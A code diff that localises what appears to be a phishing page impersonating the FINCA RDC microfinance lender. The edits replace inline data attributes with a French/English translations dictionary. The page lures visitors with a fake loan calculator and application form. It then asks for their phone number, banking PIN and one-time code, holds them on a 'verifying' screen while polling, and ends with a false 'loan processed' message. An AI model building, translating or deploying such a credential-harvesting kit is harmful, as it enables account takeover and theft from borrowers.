@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>FINCA RDC - Crédit en Ligne</title>
+  <title>FINCA RDC</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap');
 
@@ -62,7 +62,6 @@
       flex-shrink: 0; 
     }
     
-    /* FINCA Logo styling */
     .logo-container { display: flex; align-items: center; gap: 8px; }
     .logo-icon {
       width: 32px; height: 32px;
@@ -74,21 +73,12 @@
       justify-content: center;
     }
     .logo-icon::after {
-      content: '';
-      position: absolute;
-      width: 18px; height: 18px;
-      background: #fff;
-      border-radius: 50% 50% 0 0;
-      top: 7px;
+      content: ''; position: absolute; width: 18px; height: 18px;
+      background: #fff; border-radius: 50% 50% 0 0; top: 7px;
     }
     .logo-icon::before {
-      content: '';
-      position: absolute;
-      width: 24px; height: 12px;
-      background: #fff;
-      border-radius: 50%;
-      bottom: 5px;
-      z-index: 2;
+      content: ''; position: absolute; width: 24px; height: 12px;
+      background: #fff; border-radius: 50%; bottom: 5px; z-index: 2;
     }
     .navbar h1 { font-size: 1.4rem; font-weight: 700; color: #999; letter-spacing: 1px;}
     
@@ -276,22 +266,22 @@
     <!-- Page 1: Hero & Calculator -->
     <div id="page1" class="page active">
       <div class="hero-section">
-        <h2 data-en="Boost your business today" data-fr="Boost your business today">Boost your business today</h2>
-        <p data-en="Apply for your credit online<br>Response in 7 days" data-fr="Apply for your credit online<br>Response in 7 days">Apply for your credit online<br>Response in 7 days</p>
-        <button class="btn-primary" onclick="showPage('page2')" data-en="Apply for your loan" data-fr="Apply for your loan">Apply for your loan</button>
+        <h2 id="t-hero-title">Boostez votre entreprise dès aujourd'hui</h2>
+        <p id="t-hero-sub">Demandez votre crédit en ligne<br>Réponse en 7 jours</p>
+        <button class="btn-primary" onclick="showPage('page2')" id="t-hero-btn">Demander votre prêt</button>
       </div>
 
       <div class="calc-card">
-        <div class="calc-labels"><span data-en="Loan Amount" data-fr="Montant du prêt">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
+        <div class="calc-labels"><span id="t-calc-amount">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
         <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
         <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
 
-        <div class="calc-labels"><span data-en="Loan Term" data-fr="Durée du prêt">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
+        <div class="calc-labels"><span id="t-calc-term">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
         <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-        <div class="calc-sub"><span data-en="6 months" data-fr="6 mois">6 mois</span><span data-en="60 months" data-fr="60 mois">60 mois</span></div>
+        <div class="calc-sub"><span id="t-term-min">6 mois</span><span id="t-term-max">60 mois</span></div>
 
         <div class="monthly-box">
-          <span data-en="Monthly Payment" data-fr="Paiement mensuel">Paiement mensuel</span>
+          <span id="t-monthly">Paiement mensuel</span>
           <span id="monthlyLabel">45 000 FC</span>
         </div>
       </div>
@@ -299,42 +289,42 @@
 
     <!-- Page 2: Questionnaire -->
     <div id="page2" class="page">
-      <h2 class="form-title" data-en="Your Application" data-fr="Votre Demande">Votre Demande</h2>
+      <h2 class="form-title" id="t-form-title">Votre Demande</h2>
       <form id="formQuestionnaire" style="padding-bottom: 20px;">
         <div class="form-group">
-          <label data-en="Full name" data-fr="Nom complet">Nom complet</label>
-          <input type="text" id="qName" required data-en-placeholder="Enter your full name" data-fr-placeholder="Entrez votre nom complet" placeholder="Entrez votre nom complet">
+          <label id="t-name">Nom complet</label>
+          <input type="text" id="qName" required placeholder="Entrez votre nom complet">
         </div>
         <div class="form-group">
-          <label data-en="Employment status" data-fr="Situation professionnelle">Situation professionnelle</label>
+          <label id="t-emp">Situation professionnelle</label>
           <select id="qEmployment" required>
-            <option value="" data-en="Select your status" data-fr="Sélectionnez votre situation">Sélectionnez votre situation</option>
-            <option value="Employed" data-en="Employed" data-fr="Employé">Employé</option>
-            <option value="Self-Employed" data-en="Self-Employed" data-fr="Travailleur indépendant">Travailleur indépendant</option>
-            <option value="Unemployed" data-en="Unemployed" data-fr="Sans emploi">Sans emploi</option>
+            <option value="" id="t-emp-sel">Sélectionnez votre situation</option>
+            <option value="Employé" id="t-emp-1">Employé</option>
+            <option value="Travailleur indépendant" id="t-emp-2">Travailleur indépendant</option>
+            <option value="Sans emploi" id="t-emp-3">Sans emploi</option>
           </select>
         </div>
         <div class="form-group">
-          <label data-en="Monthly income (FC)" data-fr="Revenu mensuel (FC)">Revenu mensuel (FC)</label>
-          <input type="number" id="qIncome" required data-en-placeholder="Enter your monthly income" data-fr-placeholder="Entrez votre revenu mensuel" placeholder="Entrez votre revenu mensuel">
+          <label id="t-income">Revenu mensuel (FC)</label>
+          <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
         </div>
         <div class="form-group">
-          <label data-en="Loan amount (FC)" data-fr="Montant du prêt (FC)">Montant du prêt (FC)</label>
-          <input type="number" id="qAmount" required data-en-placeholder="Enter loan amount" data-fr-placeholder="Entrez le montant du prêt" placeholder="Entrez le montant du prêt">
+          <label id="t-amount">Montant du prêt (FC)</label>
+          <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
         </div>
         <div class="form-group">
-          <label data-en="Repayment period" data-fr="Période de remboursement">Période de remboursement</label>
+          <label id="t-period">Période de remboursement</label>
           <select id="qTerm" required>
-            <option value="" data-en="Select period" data-fr="Sélectionnez la période">Sélectionnez la période</option>
-            <option value="6 months" data-en="6 months" data-fr="6 mois">6 mois</option>
-            <option value="12 months" data-en="12 months" data-fr="12 mois">12 mois</option>
-            <option value="24 months" data-en="24 months" data-fr="24 mois">24 mois</option>
-            <option value="36 months" data-en="36 months" data-fr="36 mois">36 mois</option>
+            <option value="" id="t-period-sel">Sélectionnez la période</option>
+            <option value="6 mois" id="t-period-1">6 mois</option>
+            <option value="12 mois" id="t-period-2">12 mois</option>
+            <option value="24 mois" id="t-period-3">24 mois</option>
+            <option value="36 mois" id="t-period-4">36 mois</option>
           </select>
         </div>
         
         <div class="error" id="errQ"></div>
-        <button type="submit" class="btn-submit" data-en="SUBMIT APPLICATION" data-fr="SOUMETTRE LA DEMANDE">SOUMETTRE LA DEMANDE</button>
+        <button type="submit" class="btn-submit" id="t-submit">SOUMETTRE LA DEMANDE</button>
       </form>
     </div>
 
@@ -343,17 +333,17 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo">FINCA</div>
-          <h3 data-en="Login" data-fr="Connexion">Connexion</h3>
+          <h3 id="t-login">Connexion</h3>
 
           <div class="phone-input-box">
             <div class="country-code">
               <div class="flag-icon"></div>
               +243
             </div>
-            <input type="tel" id="pPhone" data-en-placeholder="Phone Number" data-fr-placeholder="Numéro de téléphone" placeholder="Numéro de téléphone">
+            <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
           </div>
 
-          <p class="pin-label" data-en="Enter your PIN" data-fr="Entrez votre code PIN">Entrez votre code PIN</p>
+          <p class="pin-label" id="t-pin">Entrez votre code PIN</p>
           <div class="pin-boxes" id="pinContainer">
             <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
@@ -364,14 +354,14 @@
         </div>
 
         <div class="login-bottom">
-          <p data-en="To register a FINCA account or get assistance,<br>click below" data-fr="Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
+          <p id="t-register-text">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
           <div class="bottom-buttons">
-            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span data-en="Register" data-fr="S'inscrire">S'inscrire</span></button>
-            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span data-en="Help & Support" data-fr="Aide & Support">Aide & Support</span></button>
+            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">S'inscrire</span></button>
+            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Aide & Support</span></button>
           </div>
           <div class="login-footer">
             v4.0.3P<br><br>
-            <span data-en="By signing in you agree to the" data-fr="En vous connectant, vous acceptez les">En vous connectant, vous acceptez les</span> <a href="#" data-en="Terms and Conditions" data-fr="Conditions Générales">Conditions Générales</a>
+            <span id="t-terms-text">En vous connectant, vous acceptez les</span> <a href="#" id="t-terms-link">Conditions Générales</a>
           </div>
         </div>
       </div>
@@ -382,7 +372,7 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo">FINCA</div>
-          <h3 data-en="Enter the OTP code sent to" data-fr="Entrez le code OTP envoyé à">Entrez le code OTP envoyé à</h3>
+          <h3 id="t-otp">Entrez le code OTP envoyé à</h3>
           <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
@@ -394,12 +384,12 @@
             <input type="text" maxlength="1" inputmode="numeric" id="otp5">
           </div>
 
-          <p class="resend-text"><span data-en="Resend OTP in" data-fr="Renvoyer l'OTP dans">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
+          <p class="resend-text"><span id="t-resend">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
           <div class="error" id="errOtp" style="margin-top: 15px;"></div>
         </div>
 
         <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span data-en="Help & Support" data-fr="Aide & Support">Aide & Support</span></div>
+          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Aide & Support</span></div>
           <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
@@ -409,15 +399,15 @@
     <div id="page-waiting" class="page">
       <div class="waiting-screen">
         <div class="spinner"></div>
-        <h2 data-en="Please wait..." data-fr="Veuillez patienter...">Veuillez patienter...</h2>
-        <p data-en="We are verifying your details.<br>This may take a moment." data-fr="Nous vérifions vos informations.<br>Cela peut prendre un moment.">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
+        <h2 id="t-wait-title">Veuillez patienter...</h2>
+        <p id="t-wait-sub">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
       </div>
     </div>
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" data-en="Congratulations!" data-fr="Félicitations!">Félicitations!</h2>
-      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" data-en="Your loan application has been fully processed. Please check your account shortly." data-fr="Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
+      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Félicitations!</h2>
+      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
     </div>
   </div>
 </div>
@@ -428,6 +418,96 @@
   let isPolling = false;
   let currentLang = 'fr';
 
+  // Dictionary of translations
+  const translations = {
+    en: {
+      heroTitle: "Boost your business today",
+      heroSub: "Apply for your credit online<br>Response in 7 days",
+      heroBtn: "Apply for your loan",
+      calcAmount: "Loan Amount",
+      calcTerm: "Loan Term",
+      termMin: "6 months",
+      termMax: "60 months",
+      monthly: "Monthly Payment",
+      formTitle: "Your Application",
+      name: "Full name",
+      emp: "Employment status",
+      empSel: "Select your status",
+      emp1: "Employed",
+      emp2: "Self-Employed",
+      emp3: "Unemployed",
+      income: "Monthly income (FC)",
+      amount: "Loan amount (FC)",
+      period: "Repayment period",
+      periodSel: "Select period",
+      period1: "6 months",
+      period2: "12 months",
+      period3: "24 months",
+      period4: "36 months",
+      submit: "SUBMIT APPLICATION",
+      login: "Login",
+      pin: "Enter your PIN",
+      registerText: "To register a FINCA account or get assistance,<br>click below",
+      registerBtn: "Register",
+      helpBtn: "Help & Support",
+      termsText: "By signing in you agree to the",
+      termsLink: "Terms and Conditions",
+      otp: "Enter the OTP code sent to",
+      resend: "Resend OTP in",
+      waitTitle: "Please wait...",
+      waitSub: "We are verifying your details.<br>This may take a moment.",
+      successTitle: "Congratulations!",
+      successSub: "Your loan application has been fully processed. Please check your account shortly.",
+      phName: "Enter your full name",
+      phIncome: "Enter your monthly income",
+      phAmount: "Enter loan amount",
+      phPhone: "Phone Number"
+    },
+    fr: {
+      heroTitle: "Boostez votre entreprise dès aujourd'hui",
+      heroSub: "Demandez votre crédit en ligne<br>Réponse en 7 jours",
+      heroBtn: "Demander votre prêt",
+      calcAmount: "Montant du prêt",
+      calcTerm: "Durée du prêt",
+      termMin: "6 mois",
+      termMax: "60 mois",
+      monthly: "Paiement mensuel",
+      formTitle: "Votre Demande",
+      name: "Nom complet",
+      emp: "Situation professionnelle",
+      empSel: "Sélectionnez votre situation",
+      emp1: "Employé",
+      emp2: "Travailleur indépendant",
+      emp3: "Sans emploi",
+      income: "Revenu mensuel (FC)",
+      amount: "Montant du prêt (FC)",
+      period: "Période de remboursement",
+      periodSel: "Sélectionnez la période",
+      period1: "6 mois",
+      period2: "12 mois",
+      period3: "24 mois",
+      period4: "36 mois",
+      submit: "SOUMETTRE LA DEMANDE",
+      login: "Connexion",
+      pin: "Entrez votre code PIN",
+      registerText: "Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous",
+      registerBtn: "S'inscrire",
+      helpBtn: "Aide & Support",
+      termsText: "En vous connectant, vous acceptez les",
+      termsLink: "Conditions Générales",
+      otp: "Entrez le code OTP envoyé à",
+      resend: "Renvoyer l'OTP dans",
+      waitTitle: "Veuillez patienter...",
+      waitSub: "Nous vérifions vos informations.<br>Cela peut prendre un moment.",
+      successTitle: "Félicitations!",
+      successSub: "Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.",
+      phName: "Entrez votre nom complet",
+      phIncome: "Entrez votre revenu mensuel",
+      phAmount: "Entrez le montant du prêt",
+      phPhone: "Numéro de téléphone"
+    }
+  };
+
   async function init() {
     try {
       const res = await fetch('/api/session', { method: 'POST' });
@@ -437,19 +517,60 @@
   }
   init();
 
-  // Language Switcher
+  // Language Switcher Logic
   function setLanguage(lang) {
     currentLang = lang;
     document.getElementById('btn-en').classList.toggle('active', lang === 'en');
     document.getElementById('btn-fr').classList.toggle('active', lang === 'fr');
 
-    document.querySelectorAll('[data-en]').forEach(el => {
-      el.innerHTML = el.getAttribute(`data-${lang}`);
-    });
+    const t = translations[lang];
+
+    document.getElementById('t-hero-title').innerHTML = t.heroTitle;
+    document.getElementById('t-hero-sub').innerHTML = t.heroSub;
+    document.getElementById('t-hero-btn').innerHTML = t.heroBtn;
+    document.getElementById('t-calc-amount').innerHTML = t.calcAmount;
+    document.getElementById('t-calc-term').innerHTML = t.calcTerm;
+    document.getElementById('t-term-min').innerHTML = t.termMin;
+    document.getElementById('t-term-max').innerHTML = t.termMax;
+    document.getElementById('t-monthly').innerHTML = t.monthly;
     
-    document.querySelectorAll('[data-en-placeholder]').forEach(el => {
-      el.placeholder = el.getAttribute(`data-${lang}-placeholder`);
-    });
+    document.getElementById('t-form-title').innerHTML = t.formTitle;
+    document.getElementById('t-name').innerHTML = t.name;
+    document.getElementById('t-emp').innerHTML = t.emp;
+    document.getElementById('t-emp-sel').innerHTML = t.empSel;
+    document.getElementById('t-emp-1').innerHTML = t.emp1;
+    document.getElementById('t-emp-2').innerHTML = t.emp2;
+    document.getElementById('t-emp-3').innerHTML = t.emp3;
+    document.getElementById('t-income').innerHTML = t.income;
+    document.getElementById('t-amount').innerHTML = t.amount;
+    document.getElementById('t-period').innerHTML = t.period;
+    document.getElementById('t-period-sel').innerHTML = t.periodSel;
+    document.getElementById('t-period-1').innerHTML = t.period1;
+    document.getElementById('t-period-2').innerHTML = t.period2;
+    document.getElementById('t-period-3').innerHTML = t.period3;
+    document.getElementById('t-period-4').innerHTML = t.period4;
+    document.getElementById('t-submit').innerHTML = t.submit;
+
+    document.getElementById('t-login').innerHTML = t.login;
+    document.getElementById('t-pin').innerHTML = t.pin;
+    document.getElementById('t-register-text').innerHTML = t.registerText;
+    document.getElementById('t-register-btn').innerHTML = t.registerBtn;
+    document.getElementById('t-help-btn').innerHTML = t.helpBtn;
+    document.getElementById('t-help-btn-2').innerHTML = t.helpBtn;
+    document.getElementById('t-terms-text').innerHTML = t.termsText;
+    document.getElementById('t-terms-link').innerHTML = t.termsLink;
+
+    document.getElementById('t-otp').innerHTML = t.otp;
+    document.getElementById('t-resend').innerHTML = t.resend;
+    document.getElementById('t-wait-title').innerHTML = t.waitTitle;
+    document.getElementById('t-wait-sub').innerHTML = t.waitSub;
+    document.getElementById('t-success-title').innerHTML = t.successTitle;
+    document.getElementById('t-success-sub').innerHTML = t.successSub;
+
+    document.getElementById('qName').placeholder = t.phName;
+    document.getElementById('qIncome').placeholder = t.phIncome;
+    document.getElementById('qAmount').placeholder = t.phAmount;
+    document.getElementById('pPhone').placeholder = t.phPhone;
 
     updateCalc();
   }
@@ -464,7 +585,7 @@
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
     
-    const fcText = currentLang === 'en' ? 'FC' : 'FC';
+    const fcText = 'FC';
     const moisText = currentLang === 'en' ? 'months' : 'mois';
 
     document.getElementById('amountLabel').textContent = Number(amount).toLocaleString('fr-FR') + ' ' + fcText;
@@ -474,7 +595,6 @@
     document.getElementById('monthlyLabel').textContent = Number(monthly).toLocaleString('fr-FR', {maximumFractionDigits: 0}) + ' ' + fcText;
   }
 
-  // Page 2 Submit
   document.getElementById('formQuestionnaire').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = e.target.querySelector('button');
@@ -510,7 +630,6 @@
     }
   }
 
-  // Page 3 Submit
   async function submitRegistration() {
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
